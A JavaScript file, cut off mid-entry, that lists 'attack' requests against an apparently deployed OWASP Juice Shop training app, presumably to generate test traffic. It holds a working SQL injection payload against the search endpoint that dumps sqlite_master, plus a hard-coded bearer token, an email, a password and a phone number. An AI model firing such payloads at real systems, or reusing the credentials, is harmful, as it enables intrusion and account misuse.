import axios from 'axios';
const baseurl = 'http://juiceshop-lb1-217932430.us-east-2.elb.amazonaws.com/';

const inputApiSet = {
    "GET": [{
            attack: "rest/wallet/balance",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "rest/track-order/6256-9b6895d4af70df44",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "ftp/",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "rest/products/24/reviews ",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "rest/saveLoginIp",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "api/Quantitys/",
            auth: ""
        },
        {
            attack: "rest/products/search?q=apple'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--",
            auth: ""
        },
        {
            attack: "api/Recycles",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "api/Products/24",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "rest/order-history",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "profile",
            auth: ""
        },
        {
            attack: "rest/user/whoami",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "api/Cards/",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "api/Deliverys/1",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "api/Cards",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "api/Addresss/7",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "api/Addresss",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.    eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "rest/basket/6",
            auth: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
        },
        {
            attack: "rest/memories",
            auth: ""
        },
        {
            attack: "rest/admin/application-configuration",
            auth: ""
        },

    ],

    "POST": [{
            attack: "rest/basket/6/checkout",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json;charset=UTF-8',
                'auth': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
            },
            data: {
                couponData: "Q291cG9uMTIzMy0xNjY4NDY2ODAwMDAw",
                orderDetails: {
                    "paymentId": "7",
                    "addressId": "7",
                    "deliveryMethodId": "1"
                }
            }
        },
        {
            attack: "api/Feedbacks",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json;charset=UTF-8',
                'auth': ""
            },
            data: {
                "captchaId": 0,
                "captcha": "9",
                "comment": "hello (anonymous)",
                "rating": 5
            }
        },
        {
            attack: "api/Users",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json;charset=UTF-8',
                'auth': ""
            },
            data: {
                "email": "jhimansch1@gmail.com",
                "password": "Abcd@1234@4321",
                "passwordRepeat": "Abcd@1234@4321",
                "securityQuestion": {
                    "id": 2,
                    "question": "Mother's maiden name?",
                    "createdAt": "2022-11-15T07:33:59.112Z",
                    "updatedAt": "2022-11-15T07:33:59.112Z"
                },
                "securityAnswer": "test"
            }
        },
        {
            attack: "api/SecurityAnswer",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json;charset=UTF-8',
                'auth': ""
            },
            data: {
                "UserId": 21,
                "answer": "test",
                "SecurityQuestionId": 2
            }
        },
        {
            attack: "rest/user/login",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json;charset=UTF-8',
                'auth': ""
            },
            data: {
                "email": "jhimansch1@gmail.com",
                "password": "Abcd@1234@4321"
            }
        },
        {
            attack: "api/BasketItems",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json;charset=UTF-8',
                'auth': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
            },
            data: {
                "ProductId": 24,
                "BasketId": "6",
                "quantity": 1
            }
        },
        {
            attack: "api/Addresss/",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json;charset=UTF-8',
                'auth': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
            },
            data: {
                "country": "India",
                "fullName": "Greg",
                "mobileNum": 9158565516,
                "zipCode": "411037",
